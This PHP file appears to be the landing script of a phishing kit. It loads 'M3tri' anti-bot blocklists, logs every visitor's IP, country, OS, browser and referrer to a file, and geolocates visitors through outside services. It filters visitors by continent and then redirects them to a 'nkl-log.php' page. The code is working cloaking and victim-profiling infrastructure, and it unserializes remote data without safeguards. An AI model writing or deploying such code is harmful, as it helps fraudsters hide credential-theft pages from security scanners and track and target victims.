<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');

session_start();

$stripos = 0;

include 'M3tri-anti-bots_v0.01/M3tri-ips.php';
include 'M3tri-anti-bots_v0.01/M3tri-OS-BRS.php';
include 'M3tri-anti-bots_v0.01/M3tri-UA.php';
include 'M3tri-anti-bots_v0.01/M3tri-vpn-proxy.php';

$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');


$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'      =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
							'/kalilinux/i'          =>  'KaliLinux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile',
							'/Windows Phone/i'      =>  'Windows Phone'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
							'/Mozilla/i'	=>	'Mozilla',
							'/Mozilla/5.0/i'=>	'Mozilla',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/edge/i'       =>  'Edge',
                            '/opera/i'      =>  'Opera',
							'/OPR/i'        =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
							'/Bot/i'		=>	'BOT Browser',
							'/Valve Steam GameOverlay/i'  =>  'Steam',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

$user_os        =   getOS();
$user_browser   =   getBrowser();

//$device_details =   "<strong>Browser: </strong>".$user_browser."<br /><strong>Operating System: </strong>".$user_os."";

$ip = $_SERVER['REMOTE_ADDR'];

$site_refer = $_SERVER['HTTP_REFERER'];
	
	if($site_refer == ""){
		$site = "dirrect connection";
	}
  
	else{
		$site = $site_refer;
	}
  
	$owner = "HIDE THIS IP ADDRESS";   
 
	$owner_country = "YOUR COUNTRY TAG FOR YOUR IP ↑"; 
  
	if($ip == $owner){ 
		$ip = "Owner"; 
		$country = $owner_country;
	}

	else{
		$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
		$country = $details->country;
	}
	// Writing in to txt file
 $myfile = file_put_contents('./visites/visited-ips.txt',date("Y-m-d - H:i:s - "). $country. " ". $ip." | ". $user_os. " | ". $user_browser. " | Come from site :". $site. " | user agent:" .$user_agent .PHP_EOL , FILE_APPEND | LOCK_EX);
fclose($myfile);

function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 

function fOpenRequest($url) {
   $file = fopen($url, 'r');
   $data = stream_get_contents($file);
   fclose($file);
   return $data;
}

$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;

if(strlen(unserialize(file_get_contents($geoip))['geoplugin_countryCode']) == 2){ $getIt = 'file_get_contents'; 
}else if(strlen(unserialize(curl_get_contents($geoip))['geoplugin_countryCode']) == 2){ $getIt = 'curl_get_contents'; 
}else if(strlen(unserialize(fOpenRequest($geoip))['geoplugin_countryCode']) == 2){ $getIt = 'fOpenRequest'; }else{ exit(); }


$_SESSION['getIt'] = $getIt;

if($_GET['storage'] == $_SERVER['HTTP_HOST']){ $_SESSION['storage'] = 'yes'; }

if($_SESSION['storage'] == 'yes' || !isset($_SESSION['countryCode'])){



$addrDetailsArr = unserialize($getIt($geoip)); 
$_SESSION['continentCode'] = $addrDetailsArr['geoplugin_continentCode'];
$_SESSION['countryCode'] = $addrDetailsArr['geoplugin_countryCode'];
$_SESSION['countryName'] = $addrDetailsArr['geoplugin_countryName'];

}

if ($_SESSION['continentCode'] !== 'EU' && $_SESSION['continentCode'] !== 'AF')
{
      $stripos = $stripos + 1;
} 





$csrftoken = base64_encode($_SERVER['HTTP_USER_AGENT'] . getenv('REMOTE_ADDR') . date('Y:M:D'));


$DIR = "nkl-log.php?token=". $csrftoken;


header("location:$DIR");


?>
    